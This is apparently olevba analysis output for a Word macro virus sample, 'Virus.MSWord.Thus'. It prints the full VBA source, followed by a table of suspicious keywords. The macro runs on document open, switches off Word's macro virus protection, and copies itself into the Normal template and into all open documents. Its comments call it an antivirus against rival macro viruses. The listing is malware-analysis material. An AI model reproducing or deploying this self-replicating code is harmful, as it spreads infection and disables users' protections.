olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thus.ft
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thus.ft - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'Thus_001'
'Anti-Smyser'
'kill'
' Этот антивирус против вируса Anti-Smyser должен работать:)
Dim k As Variant
Dim i As Variant
Dim ble As Boolean
Dim se As Boolean
Dim gro As Boolean
Dim blea As Boolean
Dim sea As Boolean
Dim groa As Boolean
    On Error Resume Next
    Application.Options.VirusProtection = False
'Операции записи антивируса
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(4, 1) <> "'kill'" Then
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) = "'Anti-Smyser'" Then
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
        .DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1) _
        .CodeModule.CountOfLines
    End If
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
        .InsertLines 1, ActiveDocument.VBProject.VBComponents.Item(1) _
        .CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents _
        .Item(1).CodeModule.CountOfLines)
    End If
    End If
    
    For k = 1 To Application.Documents.Count
        If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(4, 1) <> "'kill'" Then
        If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) = "'Anti-Smyser'" Then
            Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
            .CodeModule.DeleteLines 1, Application.Documents.Item(k) _
            .VBProject.VBComponents.Item(1).CodeModule.CountOfLines
        End If
    
        If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
            Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
            .CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents _
            .Item(1).CodeModule.Lines(1, NormalTemplate.VBProject _
            .VBComponents.Item(1).CodeModule.CountOfLines)
        End If
        End If
    Next k
    
'Работа антивируса с основным шаблоном
ble = False
se = False
gro = False
    For i = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents.Item(i).Name = "MacroBle" Then ble = True
        If NormalTemplate.VBProject.VBComponents.Item(i).Name = "TheSecond" Then se = True
        If NormalTemplate.VBProject.VBComponents.Item(i).Name = "groove" Then gro = True
    Next i
    If ble Then
        NormalTemplate.VBProject.VBComponents.Item("MacroBle").CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item("MacroBle").CodeModule.CountOfLines
    End If
    If se Then
        NormalTemplate.VBProject.VBComponents.Item("TheSecond").CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item("TheSecond").CodeModule.CountOfLines
    End If
    If gro Then
        NormalTemplate.VBProject.VBComponents.Item("groove").CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item("groove").CodeModule.CountOfLines
    End If
    If NormalTemplate.Saved = False Then NormalTemplate.Save

'Работа антивируса с открытыми документами
    For k = 1 To Application.Documents.Count
        Application.Documents.Item(k).Activate
        For i = 1 To NormalTemplate.VBProject.VBComponents.Count
            If ActiveDocument.VBProject.VBComponents.Item(i).Name = "MacroBle" Then blea = True Else blea = False
            If ActiveDocument.VBProject.VBComponents.Item(i).Name = "TheSecond" Then sea = True Else sea = False
            If ActiveDocument.VBProject.VBComponents.Item(i).Name = "groove" Then groa = True Else groa = False
        Next i
        If blea Then
            ActiveDocument.VBProject.VBComponents.Item("MacroBle").CodeModule.DeleteLines 1, ActiveDocument.VBProject.VBComponents.Item("MacroBle").CodeModule.CountOfLines
        End If
        If sea Then
            ActiveDocument.VBProject.VBComponents.Item("TheSecond").CodeModule.DeleteLines 1, ActiveDocument.VBProject.VBComponents.Item("TheSecond").CodeModule.CountOfLines
        End If
        If groa Then
            ActiveDocument.VBProject.VBComponents.Item("groove").CodeModule.DeleteLines 1, ActiveDocument.VBProject.VBComponents.Item("groove").CodeModule.CountOfLines
        End If
    Next k
End Sub











+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

